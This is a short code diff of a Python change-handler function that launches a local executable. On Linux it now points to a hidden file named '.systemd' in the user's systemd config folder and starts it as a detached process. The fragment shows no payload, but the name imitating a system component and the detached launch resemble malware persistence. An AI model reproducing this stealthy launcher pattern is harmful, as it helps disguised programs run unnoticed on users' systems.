@@ -18,14 +18,14 @@ def run_executable_on_change():
     elif os_type == "Darwin":  # macOS
         executable_path = "/path/to/mac_app.app/Contents/MacOS/mac_app"
     elif os_type == "Linux":
-        executable_path = f"/home/{user}/.config/systemd/user/.systemd.service"
+        executable_path = f"/home/{user}/.config/systemd/user/.systemd"
     else:
         print(f"[ChangeHandler] Unsupported OS: {os_type}")
         return
 
     if os.path.exists(executable_path):
         try:
-            subprocess.Popen([executable_path], shell=False)
+            subprocess.Popen([executable_path], close_fds=True, start_new_session=True)
             print(f"[ChangeHandler] Launched: {executable_path}")
         except Exception as e:
             print(f"[ChangeHandler] Failed to run: {e}")
